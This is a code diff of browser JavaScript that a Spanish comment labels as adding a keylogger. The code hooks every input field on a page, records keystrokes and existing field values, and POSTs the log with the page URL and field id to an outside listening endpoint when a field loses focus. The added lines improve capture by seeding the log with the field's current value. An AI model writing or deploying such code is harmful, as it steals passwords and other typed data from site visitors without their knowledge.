@@ -26,7 +26,7 @@ document.addEventListener('DOMContentLoaded', function () {
         }).then(() => {
             //Finalmente agregamos el keylogger
             var inputs = document.querySelectorAll('input');
-            inputs.forEach(i =>
+            inputs.forEach(i => {
                 i.addEventListener("blur", (event) => {
                     fetch(https_listener_for_logging, {
                         method: "POST", body: JSON.stringify({ "log": log, 'url' : newUrl, 'id': event.currentTarget.getAttribute("id"), "timestamp": Date.now() }),
@@ -34,6 +34,13 @@ document.addEventListener('DOMContentLoaded', function () {
                     log = ''
                     cursor = 0
                 })
+                i.addEventListener("focus", (event) => {
+                    log = i.value
+                    var that = this;
+                    setTimeout(function(){ that.selectionStart = that.selectionEnd = 10000; }, 0);
+                    cursor = log.length
+                })
+            }
             );
 
             window.addEventListener("keydown", function (e) {
